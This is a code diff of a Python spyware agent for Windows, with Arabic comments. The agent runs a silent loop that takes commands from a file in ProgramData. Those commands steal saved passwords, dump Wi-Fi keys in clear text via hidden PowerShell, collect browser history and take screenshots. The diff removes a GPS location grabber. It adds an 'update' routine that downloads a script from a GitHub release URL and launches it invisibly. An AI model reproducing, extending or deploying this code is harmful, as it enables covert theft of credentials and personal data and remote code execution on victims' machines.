@@ -2,6 +2,8 @@ import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 
+CREATE_NO_WINDOW = 0x08000000
+
 # إعدادات القناة الثابتة
 BASE_DIR = r"C:\ProgramData\MOS"
 CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
@@ -47,7 +49,15 @@ def run_wifi():
     try:
         # هذا الأمر يجلب كل الشبكات وكلمات السر دفعة واحدة
         cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'
-        res = subprocess.check_output(["powershell", "-Command", cmd], text=True, encoding='cp850')
+
+        
+        res = subprocess.run(
+            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
+            capture_output=True,
+            text=True,
+            encoding="cp850",
+            creationflags=CREATE_NO_WINDOW
+        ).stdout
         return res if res.strip() else "No WiFi profiles found."
     except:
         return "⚠️ Error retrieving WiFi or No saved networks."
@@ -69,10 +79,50 @@ def run_history():
             except: pass
     return out
 
-def run_gps():
-    ps = "Add-Type -AssemblyName System.Device; $w = New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); Start-Sleep -S 3; if($w.Status -eq 'Ready'){$pos=$w.Position.Location; 'LAT:'+$pos.Latitude+'|LON:'+$pos.Longitude}else{'ERROR'}"
-    return subprocess.check_output(["powershell", "-Command", ps], text=True)
+import os
+import requests
+import subprocess
+from pathlib import Path
+import time
 
+# --- إعداد المسارات ---
+CROSSMOS_PATH = Path(r"C:\ProgramData\MOS\crossmos.py")
+CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/crossmos.py"
+PYTHON_EXEC   = Path(r"C:\ProgramData\MOS\python_platform.exe")
+
+def update():
+    try:
+        # 1️⃣ حذف الملف القديم إذا كان موجودًا
+        if CROSSMOS_PATH.exists():
+            CROSSMOS_PATH.unlink()
+            print("[+] Deleted old crossmos.py")
+
+        # 2️⃣ تحميل النسخة الجديدة
+        r = requests.get(CROSSMOS_URL, timeout=30)
+        if r.status_code != 200 or len(r.content) < 100:
+            print("[!] Failed to download the new crossmos.py")
+            return
+
+        # كتابة الملف الجديد في المسار المناسب
+        with open(CROSSMOS_PATH, "wb") as f:
+            f.write(r.content)
+        print("[+] Downloaded new crossmos.py successfully")
+
+        # 3️⃣ تشغيل crossmos.py باستخدام python_platform.exe بصمت
+        subprocess.Popen(
+            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
+            cwd=str(CROSSMOS_PATH.parent),
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=0x08000000  # CREATE_NO_WINDOW
+        )
+        print("[+] crossmos.py launched successfully")
+
+    except Exception as e:
+        print(f"[!] Update failed: {e}")
+
+        
 # حلقة المراقبة الصامتة
 if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
 while True:
@@ -83,7 +133,7 @@ while True:
             if cmd == "passwords": res = run_passwords()
             elif cmd == "wifi": res = run_wifi()
             elif cmd in ["history", "browser"]: res = run_history()
-            elif cmd == "gps": res = run_gps()
+            elif cmd == "update": res = update()
             elif cmd == "screenshot":
                 ImageGrab.grab().save(SS_FILE)
                 res = "SCREENSHOT_DONE"
